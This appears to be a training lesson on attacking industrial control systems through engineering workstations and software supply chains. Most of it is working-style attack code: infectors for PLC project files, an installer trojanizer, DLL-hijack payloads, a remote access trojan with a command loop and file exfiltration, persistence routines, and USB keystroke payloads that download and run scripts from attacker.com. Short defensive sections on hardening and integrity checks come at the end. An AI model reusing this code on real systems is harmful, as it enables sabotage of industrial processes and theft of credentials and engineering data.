Lesson 07: Supply Chain & EW
Attacks

Lesson 07: Supply Chain & Engineering
Workstation Attacks
Learning Objectives
●​
●​
●​
●​
●​
●​
●​
●​
●​

Compromise engineering workstations (EWS) as pivot points into OT networks
Exploit supply chain vulnerabilities in ICS software distribution
Inject malware into PLC project files (Stuxnet-style attacks)
Conduct watering hole attacks targeting ICS vendors and communities
Develop trojanized ICS software installers and updates
Implement DLL hijacking in popular ICS engineering tools
Build specialized Remote Access Trojans (RATs) for OT environments
Analyze real-world supply chain attacks (Havex, NotPetya, CCleaner, SolarWinds)
Deploy USB-based attacks in air-gapped environments

1. Engineering Workstation as Crown Jewel
1.1 Why EWS is the Ultimate Target
Engineering Workstations are the most valuable target in OT security:
Access & Credentials:
●​
●​
●​
●​

Direct programming access to PLCs, RTUs, SCADA servers
Stores PLC programs, HMI projects, network configurations
Contains plaintext or weakly encrypted passwords for all OT devices
Trusted certificates and keys for authenticated communication

Network Position:
●​
●​
●​
●​

Resides in both IT and OT zones (bridge point)
Firewall exceptions allow EWS to bypass most security controls
Can reach air-gapped systems via removable media
Often has VPN/remote access for vendor support

Security Posture:
●​
●​
●​
●​
●​

Antivirus frequently disabled (compatibility with legacy ICS software)
Running outdated Windows versions (7, XP) for software compatibility
No EDR/application whitelisting
Admin rights for engineers (required for PLC programming)
Patch management delayed or non-existent

1.2 EWS Attack Surface
┌─────────────────────────────────────────────────┐
│ Engineering Workstation (EWS)
│
├─────────────────────────────────────────────────┤
│ Attack Vectors:
│
│ 1. Spear-phishing (ICS-themed lures)
│
│ 2. Watering hole (vendor forums, downloads) │
│ 3. Supply chain (trojanized software)
│
│ 4. Physical (USB malware)
│
│ 5. Remote access (compromised TeamViewer) │
│ 6. Software vulnerabilities (unpatched apps) │
├─────────────────────────────────────────────────┤
│ Post-Compromise Capabilities:
│
│ → Read PLC programs (reverse engineer process)│
│ → Modify PLC logic (sabotage, backdoor)
│
│ → Extract credentials (all OT devices)
│
│ → Lateral movement (scan OT network)
│
│ → Deploy persistence (project file infection) │
└─────────────────────────────────────────────────┘

2. Project File Infection (Stuxnet Technique)
2.1 Siemens Step 7 Project Trojan
Siemens Step 7 projects (.s7p, .ap17) are ZIP archives containing XML configs and
compiled blocks.
# s7_project_infector.py - Inject malware into Step 7 project
import zipfile
import os
import shutil
from pathlib import Path
class Step7ProjectInfector:
def __init__(self, project_path, malware_dll):
self.project_path = project_path
self.malware_dll = malware_dll
self.temp_dir = "temp_project"
def infect_project(self):
"""
Inject malicious DLL into Step 7 project
DLL executes when engineer opens project in TIA Portal
"""
print(f"[*] Infecting project: {self.project_path}")
# Extract project archive

with zipfile.ZipFile(self.project_path, 'r') as zf:
zf.extractall(self.temp_dir)
# Inject malicious DLL (DLL hijacking)
# TIA Portal loads DLLs from project directory
dll_injection_points = [
f"{self.temp_dir}/s7otbxdx.dll", # OB/FB library DLL
f"{self.temp_dir}/S7OPMX64.dll", # Communication driver
f"{self.temp_dir}/Version.dll" # Commonly missing DLL
]
for inject_path in dll_injection_points:
if not os.path.exists(inject_path):
shutil.copy(self.malware_dll, inject_path)
print(f"[+] Injected DLL: {inject_path}")
break
# Modify project XML to auto-load malware
self.modify_project_xml()
# Rebuild infected project archive
self.rebuild_project()
print("[+] Project infection complete")
print("[*] When engineer opens project, malware executes with TIA Portal privileges")
def modify_project_xml(self):
"""
Modify project XML configuration to execute payload
"""
project_xml = f"{self.temp_dir}/System/PEData.xml"
if os.path.exists(project_xml):
with open(project_xml, 'r', encoding='utf-8') as f:
content = f.read()
# Inject VBScript/JavaScript loader (executed by TIA Portal)
malicious_script = """
<ScriptBlock>
<Script Language="VBScript">
<![CDATA[
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc
<BASE64_PAYLOAD>", 0, False
]]>
</Script>
</ScriptBlock>
"""

# Insert before closing tag
content = content.replace('</Project>', malicious_script + '</Project>')
with open(project_xml, 'w', encoding='utf-8') as f:
f.write(content)
print("[+] Modified project XML")
def rebuild_project(self):
"""
Rebuild project archive with infected files
"""
backup_path = f"{self.project_path}.bak"
shutil.copy(self.project_path, backup_path)
# Create new infected archive
with zipfile.ZipFile(self.project_path, 'w', zipfile.ZIP_DEFLATED) as zf:
for root, dirs, files in os.walk(self.temp_dir):
for file in files:
file_path = os.path.join(root, file)
arcname = file_path.replace(self.temp_dir + os.sep, '')
zf.write(file_path, arcname)
# Cleanup
shutil.rmtree(self.temp_dir)
def inject_ladder_logic_backdoor(self):
"""
Inject malicious ladder logic into PLC program blocks
Similar to Stuxnet's approach
"""
# Locate OB1 (main organization block)
ob1_path = f"{self.temp_dir}/Blocks/OB1.xml"
if os.path.exists(ob1_path):
# Parse MC7 bytecode
# Insert hidden rung that triggers on specific condition
# Rung modifies process variables or outputs
print("[+] Injected backdoor into OB1")
# Usage
infector = Step7ProjectInfector("PlantControl.ap17", "payload.dll")
infector.infect_project()

2.2 Rockwell Studio 5000 (.ACD) Infection

# acd_project_infector.py - Trojan Rockwell Studio 5000 projects
import struct
import xml.etree.ElementTree as ET
class ACDProjectInfector:
def __init__(self, acd_file):
self.acd_file = acd_file
def parse_acd_structure(self):
"""
.ACD file format (proprietary binary + XML)
Structure:
- Header (magic bytes, version)
- Project metadata (XML)
- Ladder logic (binary encoded)
- Tags database
"""
with open(self.acd_file, 'rb') as f:
data = f.read()
# Find XML section (starts with <?xml)
xml_start = data.find(b'<?xml')
xml_end = data.find(b'</RSLogix5000Content>') + len(b'</RSLogix5000Content>')
self.header = data[:xml_start]
self.xml_data = data[xml_start:xml_end]
self.ladder_data = data[xml_end:]
def inject_malicious_rung(self):
"""
Inject hidden ladder logic rung
Rung: IF hidden_tag = 1 THEN [malicious action]
"""
# Parse project XML
root = ET.fromstring(self.xml_data)
# Locate MainRoutine
for routine in root.findall(".//Routine[@Name='MainRoutine']"):
# Add hidden rung
malicious_rung = ET.Element("Rung", Number="999", Type="N")
malicious_rung.text = """
<![CDATA[
XIC(HiddenTag)OTE(CriticalOutput)AFI();
]]>
"""
routine.append(malicious_rung)
# Add hidden tag to controller tags

tags = root.find(".//Tags")
hidden_tag = ET.Element("Tag", Name="HiddenTag", DataType="BOOL")
tags.append(hidden_tag)
self.xml_data = ET.tostring(root, encoding='utf-8')
def rebuild_acd(self, output_file):
"""
Rebuild infected .ACD file
"""
with open(output_file, 'wb') as f:
f.write(self.header)
f.write(self.xml_data)
f.write(self.ladder_data)
print(f"[+] Infected ACD saved: {output_file}")
# Usage
infector = ACDProjectInfector("FactoryControl.ACD")
infector.parse_acd_structure()
infector.inject_malicious_rung()
infector.rebuild_acd("FactoryControl_Infected.ACD")

2.3 Schneider Unity Pro (.STU) Infection
# stu_project_infector.py - Schneider Unity Pro project infection
class UnityProInfector:
def __init__(self, stu_file):
self.stu_file = stu_file
def infect(self):
"""
.STU format is proprietary binary
Inject backdoor into IEC 61131-3 code sections
"""
with open(self.stu_file, 'rb') as f:
data = bytearray(f.read())
# Find IEC code section (signature search)
# Schneider uses specific markers for code blocks
iec_marker = b'\x53\x43\x48\x4E' # "SCHN"
offset = data.find(iec_marker)
if offset != -1:
# Inject malicious IL (Instruction List) code
# IL example: LD %M100; ST %Q0.0 (if M100 set, activate output)
malicious_il = bytes([
0xA0, 0x64, # LD %M100

0xB0, 0x00 # ST %Q0.0
])
data[offset:offset] = malicious_il
with open(self.stu_file + ".infected", 'wb') as f:
f.write(data)
print("[+] Schneider Unity Pro project infected")

3. Supply Chain Attacks - Real-World Case Studies
3.1 Havex/Dragonfly (2013-2014)
Overview: Russian APT compromised ICS vendor websites and trojanized software
installers.
Attack Chain:
1.​ Reconnaissance: Identify ICS software vendors
2.​ Compromise: Hack vendor websites (CMS vulnerabilities, stolen credentials)
3.​ Trojanize: Replace legitimate installers with backdoored versions
4.​ Distribution: Victims download "legitimate" software from vendor site
5.​ Infection: Havex RAT deployed, conducts OT network reconnaissance
Affected Vendors:
●​ MB Connect Line (remote access solutions)
●​ eWON (industrial VPN gateways)
●​ Multiple SCADA vendors
Havex Capabilities:
# havex_scanner.py - Reconstruct Havex OPC DA scanner
import socket
import struct
class HavexOPCScanner:
def __init__(self):
self.opc_ports = [135, 4840, 48400] # DCOM, OPC UA
def scan_network(self, subnet):
"""
Scan for OPC servers (like Havex did)
"""
for ip in self.generate_ips(subnet):
if self.check_opc_server(ip):
print(f"[+] OPC Server found: {ip}")

self.enumerate_opc_tags(ip)
def check_opc_server(self, ip):
"""
Check if host is OPC server
"""
try:
# Try OPC UA discovery
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(2)
sock.connect((ip, 4840))
# Send OPC UA Hello message
hello_msg = self.craft_opcua_hello()
sock.send(hello_msg)
response = sock.recv(1024)
if response.startswith(b'ACK'):
return True
except:
pass
return False
def enumerate_opc_tags(self, ip):
"""
Extract OPC tag list (process data names)
Exfiltrate to C2 for analysis
"""
# Use OPC DA/UA client libraries
# Read tag database
# Send to C2 server
pass
# Havex exfiltration via HTTP (to compromised PHP pages)
def exfiltrate_data(data, c2_url):
import requests
requests.post(c2_url + "/upload.php", data={'data': data})

3.2 NotPetya Supply Chain Attack (2017)
Overview: Compromised M.E.Doc (Ukrainian accounting software) update server to
distribute wiper malware.
ICS Impact: NotPetya spread to OT networks via:
●​ Engineering workstations with M.E.Doc installed

●​ Lateral movement using EternalBlue + WMIC + PsExec
●​ Disrupted Maersk (shipping), Merck (pharma), FedEx critical infrastructure
Technical Implementation:
# notpetya_style_worm.py - Self-propagating malware for EWS
import subprocess
import socket
class NotPetyaStyleWorm:
def __init__(self):
self.targets = []
def scan_network(self):
"""
Scan local subnet for vulnerable hosts
"""
# Get local IP range
local_ip = socket.gethostbyname(socket.gethostname())
subnet = '.'.join(local_ip.split('.')[:-1]) + '.0/24'
# Scan for SMB (port 445)
# Identify Windows hosts
for ip in self.generate_subnet_ips(subnet):
if self.check_smb_open(ip):
self.targets.append(ip)
def exploit_eternals(self, target_ip):
"""
Use EternalBlue (MS17-010) for propagation
"""
# Send SMB exploit payload
# Gain SYSTEM access
# Deploy worm payload
pass
def credential_theft(self):
"""
Extract credentials for lateral movement
Mimikatz-style LSASS dumping
"""
# Dump LSASS memory
# Extract plaintext passwords, hashes, tickets
# Use for PsExec/WMIC propagation
pass
def propagate_psexec(self, target_ip, username, password):
"""

Use legitimate Windows tools for lateral movement
"""
cmd = f'psexec.exe \\\\{target_ip} -u {username} -p {password} -c worm.exe'
subprocess.call(cmd, shell=True)
def wiper_payload(self):
"""
Encrypt MBR and files (destructive payload)
"""
# Overwrite MBR with bootloader showing ransom note
# Encrypt files with random key (unrecoverable)
# Target SCADA/PLC project files for maximum OT impact
pass

3.3 CCleaner Supply Chain Compromise (2017)
Overview: Attackers compromised Avast's CCleaner build environment, injecting backdoor
into v5.33 (2.7 million downloads).
Technique: Trojanize DLL during build process
// CCleaner trojan implementation (simplified)
// Injected into CCleaner's EfClientDll.dll
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID
lpReserved) {
if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
// Execute backdoor on DLL load
CreateThread(NULL, 0, BackdoorThread, NULL, 0, NULL);
}
return TRUE;
}
DWORD WINAPI BackdoorThread(LPVOID lpParam) {
// C2 communication
char c2_server[] = "216.126.x.x";
// System reconnaissance
CHAR hostname[256];
GetComputerNameA(hostname, sizeof(hostname));
// Exfiltrate to C2
send_http_post(c2_server, hostname);
// Receive second-stage payload
download_and_execute(c2_server + "/payload.exe");
return 0;

}
ICS Application: Similar technique for ICS software
# trojanize_ics_installer.py - Inject backdoor into vendor installer
import pefile
import os
class ICSInstallerTrojaner:
def __init__(self, clean_installer, backdoor_dll):
self.installer = clean_installer
self.backdoor = backdoor_dll
def inject_backdoor(self):
"""
Modify installer to drop backdoor DLL
"""
# Parse installer PE
pe = pefile.PE(self.installer)
# Add new section for backdoor
new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
new_section.Name = b'.bd\x00\x00\x00\x00\x00' # .bd section
new_section.Misc_VirtualSize = len(self.backdoor)
new_section.VirtualAddress = self.calculate_next_virtual_address(pe)
new_section.SizeOfRawData = len(self.backdoor)
new_section.PointerToRawData = self.calculate_next_raw_offset(pe)
new_section.Characteristics = 0xE0000020 # CODE | EXECUTE | READ | WRITE
# Append section
pe.__sections__.append(new_section)
# Modify entry point to execute backdoor first
original_entry = pe.OPTIONAL_HEADER.AddressOfEntryPoint
pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_section.VirtualAddress
# Backdoor code jumps back to original entry point after execution
# Write trojanized installer
pe.write(filename=self.installer + ".trojan.exe")
print("[+] Installer trojanized successfully")
# Target ICS software installers:
# - TIA Portal installer
# - RSLogix 5000 installer
# - InTouch installer
# - Ignition installer

3.4 SolarWinds Orion Supply Chain Attack (2020)
Overview: Compromised SolarWinds build system, distributed SUNBURST backdoor via
software updates.
OT Relevance: Many OT networks use SolarWinds for IT/OT monitoring.
Technique Analysis:
// SUNBURST backdoor (simplified C# pseudocode)
// Injected into SolarWinds.Orion.Core.BusinessLayer.dll
public class OrionImprovementBusinessLayer {
static OrionImprovementBusinessLayer() {
// Backdoor initialization (runs on DLL load)
Initialize();
}
static void Initialize() {
// Sleep 12-14 days to evade sandboxes
Thread.Sleep(TimeSpan.FromDays(12 + new Random().Next(2)));
// DNS-based C2 communication
string domain = GenerateDGA(); // avsvmcloud.com
string c2_ip = Resolve(domain + ".appsync-api.eu-west-1.avsvmcloud.com");
// Receive commands via DNS TXT records
string cmd = GetDNSTXT(c2_ip);
// Execute commands (file operations, process execution, etc.)
ExecuteCommand(cmd);
}
static string GenerateDGA() {
// Generate unique subdomain per victim
string user_domain = Environment.UserDomainName;
return Hash(user_domain);
}
}
ICS Software Supply Chain Attack Pattern:
# Apply SolarWinds technique to ICS software updates
class ICSUpdateTrojaner:
def __init__(self, update_package):
self.package = update_package
def inject_sunburst_style_backdoor(self):

"""
Inject stealthy backdoor into OT software update
"""
# Locate core DLL in update package
core_dll = self.extract_dll("OT_Core.dll")
# Inject backdoor class into .NET assembly
# Or patch native DLL with shellcode
# Characteristics:
# - Long sleep before activation (avoid detection)
# - DNS-based C2 (stealthy, hard to block)
# - Legitimate code signing certificate (stolen from vendor)
# - Minimal disk footprint (in-memory execution)
self.rebuild_update_package()
def sign_with_stolen_cert(self, file_path, cert_path, password):
"""
Sign trojanized update with vendor's stolen certificate
"""
import subprocess
cmd = f'signtool sign /f {cert_path} /p {password} /t http://timestamp.server.com
{file_path}'
subprocess.call(cmd)

4. Watering Hole Attacks on ICS Communities
4.1 Target ICS Forums and Knowledge Bases
High-Value Watering Holes:
●​
●​
●​
●​

Vendor support forums (Siemens, Rockwell, Schneider)
ICS training platforms
PLC programming forums (PLCTalk, PLCS.net)
Industrial automation conferences (virtual events)

# watering_hole_injector.py - Compromise ICS forum
class WateringHoleAttack:
def __init__(self, forum_url, admin_creds):
self.forum = forum_url
self.creds = admin_creds
def compromise_forum(self):
"""
Exploit forum CMS (WordPress, vBulletin, etc.)
Or use stolen admin credentials

"""
# Login as admin
session = self.login_admin()
# Inject malicious JavaScript
self.inject_javascript(session)
def inject_javascript(self, session):
"""
Inject JavaScript exploit into forum template
Targets visiting engineers
"""
malicious_js = """
<script>
// Browser exploitation framework (BeEF hook)
var s = document.createElement('script');
s.src = 'http://attacker.com/hook.js';
document.body.appendChild(s);
// Or redirect to exploit kit
if (navigator.userAgent.indexOf('Windows') !== -1) {
window.location = 'http://exploit-kit.com/landing?ref=ics';
}
</script>
"""
# Insert into forum header template
# Every page view executes malicious script
def targeted_thread_injection(self):
"""
Create fake technical discussion thread
"New PLC programming tool - Download here!"
"""
thread_content = """
<b>New Siemens TIA Portal Performance Patch</b>
Hey everyone, found this unofficial patch that speeds up TIA Portal significantly.
Tested on V17 and V18.
Download: http://attacker.com/TIA_Patch_v2.3.exe
Virus scan clean, works great!
"""
# Post to popular subforum
# Engineers download and execute

4.2 Typosquatting ICS Software Download Sites
# typosquatting_campaign.py - Register similar domains
legitimate_domains = [
"siemens.com",
"rockwellautomation.com",
"schneider-electric.com",
"aveva.com"
]
typosquat_domains = [
"siem3ns.com", # 'e' -> '3'
"rockwellautomation.net", # .com -> .net
"schneider-elec.com", # shortened
"aveva-software.com" # added keyword
]
# Host malicious software downloads
# SEO optimization to rank in Google for "download TIA Portal"
# Serve trojanized installers to unsuspecting engineers

5. DLL Hijacking in ICS Software
5.1 TIA Portal DLL Hijacking
// malicious_dll.cpp - Side-loaded by TIA Portal
// Compile: cl /LD malicious_dll.cpp /Fe:Version.dll
#include <windows.h>
#include <stdio.h>
// Forward export to legitimate DLL (avoid crashes)
#pragma comment(linker,
"/export:GetFileVersionInfoA=C:\\Windows\\System32\\Version.GetFileVersionInfoA")
#pragma comment(linker,
"/export:GetFileVersionInfoW=C:\\Windows\\System32\\Version.GetFileVersionInfoW")
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID
lpReserved) {
if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
// Execute payload in context of TIA Portal
CreateThread(NULL, 0, MaliciousThread, NULL, 0, NULL);
}
return TRUE;
}
DWORD WINAPI MaliciousThread(LPVOID lpParam) {
// Hook S7 communication functions

HMODULE s7_dll = GetModuleHandleA("s7onlinx.dll");
if (s7_dll) {
// Find S7 read/write functions
void* s7_read_fn = GetProcAddress(s7_dll, "S7_Read");
// Install inline hook (detour)
InstallHook(s7_read_fn, HookedS7Read);
}
// Establish C2 connection
ConnectToC2("attacker.com", 443);
return 0;
}
// Hooked S7 read function - intercept all PLC communications
int HookedS7Read(void* plc_handle, void* data, int length) {
// Log PLC data
LogToFile("plc_data.bin", data, length);
// Modify data in-flight if needed
if (IsCriticalProcess(data)) {
ModifyProcessValue(data);
}
// Call original function
return OriginalS7Read(plc_handle, data, length);
}
Deployment:
# Place malicious DLL in TIA Portal directory
copy malicious.dll "C:\Program Files\Siemens\Automation\Portal V17\Bin\Version.dll"
# When engineer launches TIA Portal, DLL is loaded
# Malware runs with engineer's privileges (admin usually)

5.2 RSLogix 5000 DLL Hijacking
# rslogix_dll_hijack.py - Generate hijack DLL for RSLogix
import os
class RSLogixDLLHijacker:
def __init__(self):
self.rslogix_path = r"C:\Program Files (x86)\Rockwell Software\RSLogix 5000"
self.missing_dlls = [
"dwmapi.dll",
"WTSAPI32.dll",
"PROPSYS.dll"

]
def find_hijack_candidates(self):
"""
Identify DLLs that RSLogix loads but don't exist
Process Monitor (Procmon) shows NAME NOT FOUND events
"""
for dll in self.missing_dlls:
dll_path = os.path.join(self.rslogix_path, dll)
if not os.path.exists(dll_path):
print(f"[+] Hijack candidate: {dll}")
def generate_malicious_dll(self, dll_name, payload_func):
"""
Generate DLL that:
1. Exports same functions as legitimate DLL
2. Forwards calls to real DLL (in System32)
3. Executes payload on DLL_PROCESS_ATTACH
"""
# Use C++ template and compile
dll_code = f"""
#include <windows.h>
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved)
{{
if (reason == DLL_PROCESS_ATTACH) {{
// Execute payload
{payload_func}();
}}
return TRUE;
}}
"""
# Compile with Visual Studio or MinGW
# Deploy to RSLogix directory
# Usage
hijacker = RSLogixDLLHijacker()
hijacker.find_hijack_candidates()

6. Remote Access Trojan (RAT) for Engineering
Workstations
6.1 ICS-Specific RAT Features
# ics_rat.py - Custom RAT for OT environments
import socket

import subprocess
import os
import json
import time
class ICS_RAT:
def __init__(self, c2_server, c2_port):
self.c2_server = c2_server
self.c2_port = c2_port
self.sock = None
def connect_to_c2(self):
"""
Establish connection to command & control server
Use HTTPS for stealth (blend with normal traffic)
"""
while True:
try:
self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
self.sock.connect((self.c2_server, self.c2_port))
print("[+] Connected to C2")
break
except:
time.sleep(60) # Retry every minute
def enumerate_ics_software(self):
"""
Detect installed ICS engineering software
"""
ics_software = {
"Siemens TIA Portal": r"C:\Program Files\Siemens\Automation",
"Rockwell RSLogix 5000": r"C:\Program Files (x86)\Rockwell Software",
"Schneider Unity Pro": r"C:\Program Files (x86)\Schneider Electric",
"Wonderware InTouch": r"C:\Program Files (x86)\Wonderware",
"Ignition": r"C:\Program Files\Inductive Automation"
}
installed = []
for name, path in ics_software.items():
if os.path.exists(path):
installed.append(name)
return installed
def extract_plc_connection_profiles(self):
"""
Extract saved PLC connection configurations
Contains IP addresses, credentials, project paths

"""
profiles = []
# TIA Portal connection profiles
tia_profiles = os.path.expanduser(r"~\AppData\Roaming\Siemens\Automation\Portal")
if os.path.exists(tia_profiles):
# Parse XML config files
# Extract PLC IP addresses, project names
# RSLogix connections (in .ACD project files and registry)
# Schneider Unity Pro connections
return profiles
def steal_plc_programs(self, plc_ip, plc_type):
"""
Use legitimate engineering software to download PLC program
Appears as normal engineering activity
"""
if plc_type == "Siemens":
# Use snap7 or TIA Portal Openness API
cmd = f'powershell -c "Import-Module TIA; Get-PLCProgram -IP {plc_ip}"'
output = subprocess.check_output(cmd, shell=True)
return output
elif plc_type == "Rockwell":
# Use RSLogix SDK
# Upload .ACD file from PLC
pass
def inject_malware_into_plc(self, plc_ip, malware_block):
"""
Modify PLC program to include backdoor
Upload using legitimate tools (trusted by network monitoring)
"""
# Download existing program
original_program = self.steal_plc_programs(plc_ip, "Siemens")
# Inject malicious rung/block
infected_program = self.inject_malicious_logic(original_program, malware_block)
# Upload infected program
self.upload_program(plc_ip, infected_program)
def screenshot_engineering_screens(self):
"""
Capture HMI/SCADA screenshots
Reveals process architecture, tag names, setpoints

"""
import pyautogui
screenshot = pyautogui.screenshot()
screenshot.save("ews_screenshot.png")
return "ews_screenshot.png"
def exfiltrate_project_files(self):
"""
Steal all PLC project files from EWS
"""
project_paths = [
r"C:\Users\*\Documents\Siemens\*.ap17",
r"C:\Users\*\Documents\Rockwell\*.ACD",
r"C:\Users\*\Documents\Schneider\*.STU"
]
# Zip and exfiltrate
import zipfile
with zipfile.ZipFile("stolen_projects.zip", 'w') as zf:
for pattern in project_paths:
for file in glob.glob(pattern):
zf.write(file)
# Send to C2
self.upload_file_to_c2("stolen_projects.zip")
def command_loop(self):
"""
Main C2 command loop
"""
while True:
# Receive command from C2
cmd = self.sock.recv(4096).decode()
if cmd == "enum_ics":
result = self.enumerate_ics_software()
elif cmd == "steal_projects":
result = self.exfiltrate_project_files()
elif cmd == "screenshot":
result = self.screenshot_engineering_screens()
elif cmd.startswith("inject_plc"):
plc_ip = cmd.split()[1]
result = self.inject_malware_into_plc(plc_ip, "backdoor.ob")
# Send result back to C2
self.sock.send(json.dumps(result).encode())
# RAT main execution

if __name__ == "__main__":
rat = ICS_RAT("attacker-c2.com", 443)
rat.connect_to_c2()
rat.command_loop()

6.2 Persistence Mechanisms for EWS
# ews_persistence.py - Maintain access to compromised EWS
import winreg
import os
class EWSPersistence:
def __init__(self, payload_path):
self.payload = payload_path
def registry_run_key(self):
"""
Classic registry persistence
"""
key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
r"Software\Microsoft\Windows\CurrentVersion\Run",
0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, self.payload)
winreg.CloseKey(key)
def scheduled_task(self):
"""
Create scheduled task (more stealthy than Run key)
"""
task_xml = f"""
<?xml version="1.0" encoding="UTF-16"?>
<Task>
<Triggers>
<LogonTrigger>
<Enabled>true</Enabled>
</LogonTrigger>
</Triggers>
<Actions>
<Exec>
<Command>{self.payload}</Command>
</Exec>
</Actions>
</Task>
"""
# Create task via schtasks.exe
import subprocess

subprocess.call(f'schtasks /create /tn "SystemUpdate" /xml {task_xml}')
def wmi_event_subscription(self):
"""
WMI event persistence (fileless, stealthy)
"""
# Use PowerShell to create WMI event filter and consumer
ps_script = f"""
$Filter = Set-WmiInstance -Class __EventFilter -NameSpace "root\\subscription"
-Arguments @{{
Name="SystemUpdate";
EventNameSpace="root\\cimv2";
QueryLanguage="WQL";
Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE
TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}}
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace
"root\\subscription" -Arguments @{{
Name="SystemUpdate";
CommandLineTemplate="{self.payload}";
}}
$Binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace
"root\\subscription" -Arguments @{{
Filter=$Filter;
Consumer=$Consumer;
}}
"""
subprocess.call(f'powershell -c "{ps_script}"')
def ics_software_plugin(self):
"""
Most stealthy: Deploy as "plugin" for TIA Portal
Loads automatically when engineer opens software
"""
tia_addins = r"C:\ProgramData\Siemens\Automation\Addins"
plugin_dll = os.path.join(tia_addins, "SystemPlugin.dll")
# Copy malicious DLL
import shutil
shutil.copy(self.payload, plugin_dll)

7. USB-Based Attacks for Air-Gapped Environments
7.1 BadUSB for Industrial Environments

# badusb_industrial.py - Automated infection via USB
# Deploy on Rubber Ducky, Bash Bunny, or DigiSpark
"""
Scenario: Contractor brings infected USB to site
USB device emulates keyboard, types malicious commands
Infects air-gapped engineering workstation
"""
# Rubber Ducky payload (DuckyScript)
DUCKY_PAYLOAD = """
REM Auto-infection script for EWS
DELAY 2000
GUI r
DELAY 500
STRING powershell -NoP -NonI -W Hidden -Exec Bypass
ENTER
DELAY 1000
STRING IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/stage2.ps1')
ENTER
"""
# Stage 2 PowerShell (hosted on USB mass storage partition)
STAGE2_PS = """
# Enumerate ICS software
$ics_apps = @(
"C:\\Program Files\\Siemens",
"C:\\Program Files (x86)\\Rockwell Software"
)
foreach ($app in $ics_apps) {
if (Test-Path $app) {
# Inject DLL into application directory
Copy-Item "E:\\payload.dll" "$app\\malicious.dll"
}
}
# Establish persistence
$payload = "E:\\rat.exe"
Copy-Item $payload "C:\\Windows\\Temp\\svchost.exe"
New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-Name "Update" -Value "C:\\Windows\\Temp\\svchost.exe"
# Self-delete
Remove-Item $MyInvocation.MyCommand.Source

7.2 USB Firmware Implant

// usb_implant.c - Persistent USB device firmware modification
// Survives reformatting (malware in controller firmware)
#include <avr/io.h>
void usb_init() {
// Initialize USB controller
}
void inject_payload() {
// When USB inserted into Windows host
// Emulate keyboard
// Type PowerShell commands
// Download and execute RAT
char payload[] = "powershell -c IEX(New-Object
Net.WebClient).DownloadString('http://attacker.com/rat.ps1')";
for (int i = 0; i < sizeof(payload); i++) {
send_keystroke(payload[i]);
_delay_ms(10);
}
send_keystroke(ENTER);
}
int main() {
usb_init();
// Wait for USB insertion
while(1) {
if (host_detected()) {
inject_payload();
break;
}
}
// Become normal USB drive
mass_storage_mode();
}

8. Defensive Countermeasures
8.1 Engineering Workstation Hardening
# ews_hardening.ps1 - Harden EWS against supply chain attacks

# Enable AppLocker (application whitelisting)
New-AppLockerPolicy -RuleType Publisher -Path "C:\Program Files\Siemens\*" -Action
Allow
New-AppLockerPolicy -RuleType Publisher -Path "C:\Program Files (x86)\Rockwell
Software\*" -Action Allow
New-AppLockerPolicy -RuleType Hash -Path * -Action Deny
# Disable unnecessary services
$services = @("RemoteRegistry", "WinRM", "TeamViewer")
foreach ($svc in $services) {
Stop-Service $svc
Set-Service $svc -StartupType Disabled
}
# Enable advanced logging
auditpol /set /subcategory:"Process Creation" /success:enable
auditpol /set /subcategory:"DLL Loading" /success:enable
# USB device control (only allow approved devices)
# Group Policy: Computer Configuration > Administrative Templates > System > Device
Installation > Device Installation Restrictions

8.2 Project File Integrity Monitoring
# project_file_monitor.py - Detect trojanized project files
import hashlib
import os
class ProjectFileMonitor:
def __init__(self):
self.baseline_hashes = {}
def baseline_project(self, project_path):
"""
Create cryptographic baseline of known-good project
"""
file_hash = hashlib.sha256(open(project_path, 'rb').read()).hexdigest()
self.baseline_hashes[project_path] = file_hash
print(f"[+] Baseline created: {project_path} - {file_hash}")
def verify_project(self, project_path):
"""
Verify project hasn't been modified
"""
current_hash = hashlib.sha256(open(project_path, 'rb').read()).hexdigest()
if project_path in self.baseline_hashes:
if current_hash != self.baseline_hashes[project_path]:

print(f"[!] ALERT: Project file modified: {project_path}")
print(f"[!] Expected: {self.baseline_hashes[project_path]}")
print(f"[!] Current: {current_hash}")
return False
return True
# Deploy on file server hosting project files
monitor = ProjectFileMonitor()
monitor.baseline_project(r"\\fileserver\projects\PlantControl.ap17")

8.3 Supply Chain Verification
# verify_installer.sh - Verify software installer authenticity
INSTALLER="TIA_Portal_V17_Update.exe"
# 1. Check digital signature
osslsigncode verify -in $INSTALLER
# 2. Verify hash against vendor website
VENDOR_HASH="a1b2c3d4e5f6..." # From Siemens website
ACTUAL_HASH=$(sha256sum $INSTALLER | awk '{print $1}')
if [ "$VENDOR_HASH" != "$ACTUAL_HASH" ]; then
echo "[!] ALERT: Hash mismatch - possible trojan!"
echo "[!] Expected: $VENDOR_HASH"
echo "[!] Actual: $ACTUAL_HASH"
exit 1
fi
# 3. Sandbox execution before deployment
# Run in isolated VM, monitor behavior

9. Hands-On Lab Exercises
Lab 1: Project File Infection
Objective: Create trojanized Siemens Step 7 project
Steps:
1.​ Create clean S7 project in TIA Portal
2.​ Export project (.ap17 file)
3.​ Use Python script to inject test payload
4.​ Verify infected project loads in TIA Portal
5.​ Observe payload execution
6.​ Document detection methods

Lab 2: DLL Hijacking Exploitation
Objective: Exploit DLL search order in ICS software
Steps:
1.​ Use Process Monitor to identify missing DLLs
2.​ Create malicious DLL with exported functions
3.​ Deploy to application directory
4.​ Launch ICS software and verify DLL load
